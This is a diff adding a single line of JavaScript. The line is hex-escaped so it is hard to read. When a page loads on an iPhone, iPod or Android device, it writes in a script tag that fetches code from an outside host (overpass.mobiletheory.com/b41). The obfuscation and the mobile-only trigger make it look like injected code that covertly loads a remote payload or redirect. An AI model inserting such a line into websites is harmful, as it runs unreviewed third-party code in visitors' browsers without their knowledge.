@@ -1,0 +1,1 @@
+document.write('\x3cscript\x3e\x3c/script\x3e\x3cscript type\x3d\x22text/javascript\x22\x3eif(navigator.userAgent.match(/iphone|ipod|android/i))document.write(\x27\\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22http://overpass.mobiletheory.com/b41\x22\x3e\\x3c/script\x3e\x27);\x3c/script\x3e\n');
